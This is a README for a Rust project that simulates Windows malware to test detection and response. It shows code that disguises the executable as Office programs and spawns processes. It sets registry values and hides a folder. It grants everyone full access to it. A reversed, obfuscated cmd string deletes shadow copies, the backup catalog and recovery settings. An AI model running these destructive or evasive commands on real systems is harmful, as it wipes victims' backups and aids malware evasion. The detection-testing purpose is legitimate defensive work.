# RustMyDetection
Mimic a Windows malware in Rust

## Purpose:

To simulate the behaviour of a malware to test the detection and reaction of the operators.  
It is more a toolbox than a complete product

I am not working on a tool for:
  - pentester 
  - redteam

The icons and executable informations are taken from a version of Office 2016.

## Why Rust:

Because I want to learn it and it's fun to try new things

The code is dirty I know and it will get better as I get better

## Todo List:

- [X] Change executable internal name (build.rs)
- [X] Run a external command (run_exe)
- [X] Encode command to bypass string check very basic (run_exe_reverse)
- [X] Self-replicated (spawn)
- [ ] Download another payload
- [ ] Registry SetValue
- [ ] Drop file

## Example

### Set internal name

change value of exe_metadata to :
- Mimic::Word
- Mimic::Excel
- Mimic::Powerpoint
- Mimic::Rustmydetection

### run_exe / run_exe_reverse
```rust
    // https://app.any.run/tasks/d71d86cb-0c13-4086-85ce-d140e826fbea/

    tools::run_exe ("attrib", "+h .");
    tools::run_exe ("icacls",". /grant Everyone:F /T /C /Q");

    let mycmd = "teiuq- golatac eteled nimdabw & on delbaneyrevocer }tluafed{ tes/ tidedcb & seruliafllaerongi ycilopsutatstoob }tluafed{ tes/ tidedcb & eteled ypocwodahs cimw & teiuq/ lla/ swodahs eteled nimdassv  C/".to_string();
    tools::run_exe_reverse("cmd", &mycmd);
```
### spawn
```rust
    //get current exe
    let my_name = std::env::current_exe()
        .expect("Can't get the exec path")
        .file_name()
        .expect("Can't get the exec name").
        to_string_lossy().
        into_owned();

    match my_name.as_ref(){
        "rustmydetection.exe" => {tools::spawn(r"setup.exe");},
        "setup.exe" => {tools::spawn(r"C:\Program File\Microsoft Office\Office16\WinWord.exe");},
        _ => {}
    }
```

### Registry
Need to find how use generic type in fn

```rust
    tools::set_reg_str(HKEY_CURRENT_USER,
        "Software\\rustmydetection",
        "exe",
        "\"c:\\git\\rustmydetection.exe\"");
    
    tools::set_reg_u32(HKEY_CURRENT_USER,
        "Software\\rustmydetection",
        "start",
        1u32);
```    